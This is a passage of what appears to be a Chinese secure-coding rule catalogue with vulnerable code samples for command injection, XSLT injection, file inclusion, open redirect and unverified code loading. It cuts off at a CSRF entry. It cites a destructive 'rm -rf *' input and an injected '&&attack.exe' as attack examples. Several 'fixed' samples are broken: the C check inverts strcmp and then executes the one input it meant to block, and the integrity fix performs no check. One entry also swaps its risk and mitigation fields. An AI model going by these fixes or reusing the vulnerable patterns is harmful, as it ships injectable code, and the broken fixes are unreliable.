                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0079">系统命令注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#1">漏洞代码示例1</a></li>
<li><a href="#1_1">漏洞代码修复示例1</a></li>
<li><a href="#2">漏洞代码示例2</a></li>
<li><a href="#2_1">漏洞代码修复示例2</a><ul>
<li><a href="#1_2">修复1 : 检查输入数据安全性</a></li>
<li><a href="#2_2">修复2 : 修改不受信任的数据并使其安全</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_6">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>程序使用受外部影响的输入来构造全部或部分系统命令，但是没有对生成的命令进行有效保护，这可能会让攻击者直接在操作系统上执行意外的危险命令。</p>
<p>这种缺陷在攻击者没有直接访问被攻击系统的权限，例如在Web应用程序中，有很高的危险性。或者，如果缺陷发生在特权程序中，它可能允许攻击者指定通常无法访问的命令，或者以攻击者没有的权限调用的命令。如果受影响的进程有较高的特权，则问题会加剧，因为攻击者控制的命令可能会以特殊的系统特权运行，从而增加损害的数量。</p>
<p>系统命令注入至少有以下两个子类型：</p>
<ol>
<li>应用程序打算执行一个由其自己控制的单个固定程序。它打算使用外部提供的输入作为该程序的参数。例如，程序可能使用system（“nslookup [HOSTNAME]”）运行nslookup并允许用户提供一个用作参数的HOSTNAME。攻击者无法阻止nslookup执行。但是，如果程序没有从HOSTNAME参数中删除命令分隔符，攻击者可以将分隔符放入参数中，这样在nslookup执行完成后，它们可以执行自己的程序。</li>
<li>应用程序接受外部数据用于完全选择要运行哪个程序的输入，以及要使用的命令。应用程序只是将整个命令重定向到操作系统。例如，程序可能使用“exec（[COMMAND]）”来执行用户提供的[COMMAND]。如果COMMAND受攻击者控制，攻击者可以执行任意命令或程序。如果使用exec（）和CreateProcess（）等函数执行命令，则攻击者可能无法将多个命令组合在同一行中。</li>
</ol>
<h1 id="_2">漏洞与风险</h1>
<p>安全问题，数据泄露等。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_4">缓解与预防</h1>
<p>在存储到内存之前，请务必检查用户输入数据的安全性。</p>
<h1 id="_5">演示实例</h1>
<h3 id="1">漏洞代码示例1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">// @@bad@@</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>在这段代码代码中，通过调用system()函数执行系统命令。攻击者可以控制scanf()函数接收的外部输入，比如传入"rm -rf *"从而导致严重的安全问题。</p>
<h3 id="1_1">漏洞代码修复示例1</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">command_injection</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"rm -rf *"</span><span class="p">)){</span> <span class="c1">// @@good@@</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">system</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> 
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>在这段代码代码中，通过调用system()函数执行系统命令。开发人员对scanf()函数接收的外部输入做了简单的验证，可以预防部分系统命令注入问题。</p>
<h3 id="2">漏洞代码示例2</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>
<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>在这段代码代码中，攻击者可以控制myaction.exe的命令行参数，甚至可以在未经授权的情况下在服务器上执行其他代码，比如传入untrusted = “&amp;&amp;attack.exe”从而导致严重的安全问题。</p>
<h3 id="2_1">漏洞代码修复示例2</h3>
<h4 id="1_2">修复1 : 检查输入数据安全性</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Using a sanitizing check, for example, a checking of whether the string </span>
<span class="c1">// untrusted has a substring "&amp;&amp;" </span>
<span class="k">if</span> <span class="o">(!</span><span class="n">isSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">))</span> <span class="k">return</span><span class="o">;</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">untrusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">);</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h4 id="2_2">修复2 : 修改不受信任的数据并使其安全</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">untrusted</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"attacker_input"</span><span class="o">);</span>

<span class="c1">// Revise the untrusted data and make it safe</span>
<span class="n">String</span> <span class="n">trusted</span> <span class="o">=</span> <span class="n">makeSafe</span><span class="o">(</span><span class="n">untrusted</span><span class="o">);</span>

<span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="s">"myaction.exe "</span> <span class="o">+</span> <span class="n">trusted</span> <span class="o">+</span> <span class="s">"&amp;&amp;myaction2.exe"</span><span class="o">)</span>

<span class="n">System</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="_6">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE78">
<p>http://cwe.mitre.org/data/definitions/78.html
[^CERT-STR02-C]https://wiki.sei.cmu.edu/confluence/display/c/STR02-C.+Sanitize+data+passed+to+complex+subsystems
[^CERT-IDS07-J]https://wiki.sei.cmu.edu/confluence/display/java/IDS07-J.+Sanitize+untrusted+data+passed+to+the+Runtime.exec%28%29+method <a class="footnote-backref" href="#fnref-CWE78" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1094">XSLT注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>XSLT（Extensible Stylesheet Language Transformations）是用作转换XML文件的语言，它能将XML文件转换成另外一种形式的XML文件，也能转换成HTML文件、明文文件或XSL格式化的对象，进而再转换成别的例如PDF、PostScreipt、PNG等格式的文件。现代浏览器基本都支持XSLT 1.0。</p>
<h1 id="_2">漏洞与风险</h1>
<p>XSLT注入可能会引起信息暴露、任意代码执行、恶意的文件读写和注入等问题。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_4">缓解与预防</h1>
<ul>
<li>视所有的输入为危险的数据，通过使用白名单等的受信输入验证策略来严格清洗输入数据。</li>
</ul>
<h1 id="_5">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/XSLT <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1093">包含危险文件</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a><ul>
<li><a href="#_3">包含远程文件</a></li>
<li><a href="#_4">包含本地文件</a></li>
</ul>
</li>
<li><a href="#_5">漏洞利用威胁</a></li>
<li><a href="#_6">缓解与预防</a></li>
<li><a href="#_7">演示实例</a><ul>
<li><a href="#_8">漏洞代码示例</a></li>
</ul>
</li>
<li><a href="#_9">参考资料</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>包含危险文件漏洞允许攻击者包含一个文件，通常是利用目标程序中实现的”动态包含文件“机制来实现的。该漏洞主要出现在不会对用户提供的输入进行合理验证的系统中。</p>
<h1 id="_2">漏洞与风险</h1>
<h4 id="_3">包含远程文件</h4>
<p>当一个Web应用下载并运行一个远程文件时，可能会出现包含远程文件（Remote File Inclusion, RFI）问题。这些远程文件通常是从用户提供给本Web应用的HTTP或FTP的URI参数中获取的。</p>
<h4 id="_4">包含本地文件</h4>
<p>包含本地文件（Local File Inclusion, LFI）问题与包含远程文件问题类似，不同之处在于只有Web应用所在的服务器下的本地文件才能被包含。但因为攻击者可能会包含一个受攻击者控制的数据文件，如Web服务器的访问日志，因此还是会存在远程代码执行的风险。</p>
<h1 id="_5">漏洞利用威胁</h1>
<p>中</p>
<h1 id="_6">缓解与预防</h1>
<ul>
<li>避免将用户提交的输入数据传递给文件系统或Web框架的API。</li>
<li>维护一个文件白名单列表，声明哪些文件能被页面包含，并通过使用标识符（如序号）来访问指定的那个的文件。</li>
</ul>
<h1 id="_7">演示实例</h1>
<h3 id="_8">漏洞代码示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">&lt;%</span>
   <span class="n">String</span> <span class="n">p</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"p"</span><span class="o">);</span>
   <span class="nd">@include</span> <span class="n">file</span><span class="o">=</span><span class="s">"&lt;%="</span><span class="n">includes</span><span class="o">/</span><span class="s">" + p +"</span><span class="o">.</span><span class="na">jsp</span><span class="err">"</span><span class="k">%&gt;</span>"
%&gt;
</pre></div>
</td></tr></table>
<h1 id="_9">参考资料</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-wikipedia">
<p>https://en.wikipedia.org/wiki/File_inclusion_vulnerability <a class="footnote-backref" href="#fnref-wikipedia" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0091">URL重定向到不受信任的站点</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示示例</a><ul>
<li><a href="#1">漏洞代码示例 1</a><ul>
<li><a href="#1_1">修复代码示例 1</a></li>
</ul>
</li>
<li><a href="#2">漏洞代码示例 2</a><ul>
<li><a href="#2_1">修复代码示例 2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_6">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>Web应用程序接受用户控制的输入，该输入指定到外部站点的链接，并在重定向中使用该链接。</p>
<h1 id="_2">漏洞与风险</h1>
<p>通过修改不可信URL输入到一个恶意网站，攻击者可能会成功启动钓鱼诈骗并窃取用户凭据。 未经验证的重定向和转发攻击也可用于恶意制作一个URL，该URL将通过应用程序的访问控制检查，使得攻击者可以访问一些未经授权的函数。</p>
<h1 id="_3">缓解与预防</h1>
<p>可以通过多种方式安全使用重定向和转发：</p>
<ol>
<li>避免使用重定向和转发。  </li>
<li>如果使用重定向和转发，请不要将url作为目标的用户输入。在这种情况下，你应该有一个方法来验证URL的合法性。  </li>
<li>如果无法避免用户输入，请确保提供的URL是有效的，并且已获得用户授权。  </li>
<li>建议将任何此类目标输入映射到值，而不是实际的URL或URL的一部分，并且该服务器端代码将此值转换为目标URL。  </li>
<li>通过创建可信URL列表（主机列表或正则表达式）来过滤输入。  </li>
<li>强制所有重定向首先通过一个页面通知用户他们将离开您的网站，并让他们点击一个链接进行确认。  </li>
</ol>
<h1 id="_4">漏洞利用威胁</h1>
<p>严重</p>
<h1 id="_5">演示示例</h1>
<h3 id="1">漏洞代码示例 1</h3>
<p>以下Java代码从'url' GET参数接收URL并重定向到该URL。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>如果未验证URL的合法性，则代码易受攻击。 通过将用户重定向到恶意网站，此漏洞可能会被用作钓鱼诈骗的一部分。 如果未应用验证，恶意用户可以创建超链接将用户重定向到未经过验证的恶意网站，例如：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> http://example.com/example.php?url=http://malicious.example.com
</pre></div>
</td></tr></table>
<p>用户将看到指向原始受信任站点（example.com）的链接，并且没有意识到可能发生的重定向</p>
<h4 id="1_1">修复代码示例 1</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span>  <span class="n">string</span> <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>

  <span class="c1">// 事先检查URL合法性</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">is_safe</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">))</span> <span class="o">{</span>  
    <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">);</span>
  <span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="2">漏洞代码示例 2</h3>
<p>当应用程序允许用户输入在站点的不同部分之间转发请求时，应用程序必须检查用户是否有权访问url，执行它提供的功能，并且这是一个合适的url请求。 如果应用程序未能执行这些检查，则攻击者制作的URL可能会通过应用程序的访问控制检查，然后将攻击者转发到通常不允许的管理功能。</p>
<p>以下代码是一个Java servlet，它将在请求中接收到带有url参数的GET请求，以转发到url参数中指定的地址。 该servlet将从请求中检索url参数值，并在响应浏览器之前完成服务器端正向处理。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h4 id="2_1">修复代码示例 2</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
     <span class="c1">// 事先检查权限和跳转的合法性</span>
     <span class="k">if</span><span class="o">(</span><span class="n">isAutherized</span> <span class="n">and</span> <span class="nf">isSafe</span><span class="o">(</span><span class="n">request</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
  <span class="o">}</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="_6">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/601.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-601.html">CWE-601</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0132">下载代码时没有进行完整性检查</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">漏洞利用威胁</a></li>
<li><a href="#_4">缓解与预防</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>程序从远程下载源代码或可执行文件并执行代码，但未充分验证代码的来源和完整性。</p>
<h1 id="_2">漏洞与风险</h1>
<p>攻击者可以通过入侵主机服务器，执行DNS欺骗或修改传输中的代码来执行恶意代码。</p>
<h1 id="_3">漏洞利用威胁</h1>
<p>使用工具或框架对传输的代码执行完整性检查。</p>
<h1 id="_4">缓解与预防</h1>
<p>严重</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>此示例从本地子目录加载外部类：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>此代码不能确保加载的类是预期的类，例如通过验证类的校验和。攻击者可能会修改该类文件以执行恶意代码。</p>
<h3 id="_7">漏洞代码修复示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">URL</span><span class="o">[]</span> <span class="n">classURLs</span><span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">[]{</span>
<span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"file:subdir/"</span><span class="o">)</span>
<span class="o">};</span>
<span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="n">classURLs</span><span class="o">);</span>
<span class="n">loader</span><span class="o">.</span><span class="na">findResource</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">);</span>  <span class="c1">// Check Class</span>
<span class="n">Class</span> <span class="n">loadedClass</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"loadMe"</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="n">loader</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/494.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-494.html">CWE-494</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0093">跨站点请求伪造</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

